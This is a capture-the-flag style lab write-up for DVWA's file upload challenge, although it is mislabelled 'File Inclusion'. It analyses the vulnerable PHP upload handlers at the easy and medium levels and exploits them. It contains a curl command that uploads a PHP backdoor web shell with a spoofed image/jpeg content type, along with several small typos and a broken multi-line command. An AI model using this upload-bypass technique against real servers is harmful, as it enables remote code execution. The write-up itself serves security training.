# File Inclusion

## Easy

### Exploit
This one is pretty basic. Just choose any one of the webshells /usr/share/webshell/php/, upload it, and browse to it in /dvwa/hackackble/uploads/.

### Code Analysis
This is a basic file upload <form>.

```html
 <form enctype="multipart/form-data" action="#" method="POST" />
	 <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
	 Choose an image to upload:
	 <br />
	 <input name="uploaded" type="file" /><br />
	 <br />
	 <input type="submit" name="Upload" value="Upload" />
 </form>
```

Note that in the below PHP code, the `Upload` parameter is checked in the outermost conditional and thus must be present in the POST request; this is important to note if we wanted to send this request outside of the browser with a different HTTP client (e.g. curl). 

```php
if (isset($_POST['Upload'])) { 

		$target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; 
		$target_path = $target_path . basename( $_FILES['uploaded']['name']); 

		if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) { 

			echo '<pre>'; 
			echo 'Your image was not uploaded.'; 
			echo '</pre>'; 

		  } else { 

			echo '<pre>'; 
			echo $target_path . ' succesfully uploaded!'; 
			echo '</pre>'; 

		} 

	} 
```

## Medium

## Code Analysis
If we try to upload a PHP webshell as in the previous example, we receive an error message telling us that our file was not uploaded. If we examine the request using the browser network tab or Burp Proxy we that in addition to the file contents, the request body includes the content type which, in this case, is application/php. It's reasonable to assume that perhaps the server is expecting a content type of image/jpeg, and perhaps is even - foolishly - using this value to perform validation.

Examining the below code confirms this; the code is using the browser supplied type to validate the image. This browser can implicitly determine this value based on the file, or it can be set explicitly via the `accept` attribute of an `<input>`. Most importantly, since it is supplied by the client, it can be easily spoofed and thus should not be used for server-side validation. 

```php
 if (isset($_POST['Upload'])) { 

		 $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/"; 
		 $target_path = $target_path . basename($_FILES['uploaded']['name']); 
		 $uploaded_name = $_FILES['uploaded']['name']; 
		 $uploaded_type = $_FILES['uploaded']['type']; 
		 $uploaded_size = $_FILES['uploaded']['size']; 

		 if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){ 


			 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) { 

				 echo '<pre>'; 
				 echo 'Your image was not uploaded.'; 
				 echo '</pre>'; 

			   } else { 

				 echo '<pre>'; 
				 echo $target_path . ' succesfully uploaded!'; 
				 echo '</pre>'; 

				 } 
		 } 
		 else{ 
			 echo '<pre>Your image was not uploaded.</pre>'; 
		 } 
	 } 
```

## Exploit
The solution is to tailor an HTTP request to pass these checks.

```bash
curl --cookie 'security=medium; PHPSESSID=e2ccc471d913ae972ed0c3e5c8663886' \
	 --form MAX_FILE_SIZE=100000
	 --form Upload=Upload
	 --form 'uploaded=@/usr/share/webshells/php/backdoor.php;type=image/jpeg'
     http://192.168.56.6/dvwa/vulnerabilities/upload/
```

The key option is `--form 'uploaded=@/usr/share/webshells/php/backdoor.php;type=image/jpeg'`. Here we specify the webshell, but spoof the type by setting it to `image/jpeg` in order to bypass the `if (($uploaded_type == "image/jpeg")` check. We also include the other form fields as well the session cookie to prove that we're authenticated. Now just browse to the webshell in /dvwa/hackable/uploads/.
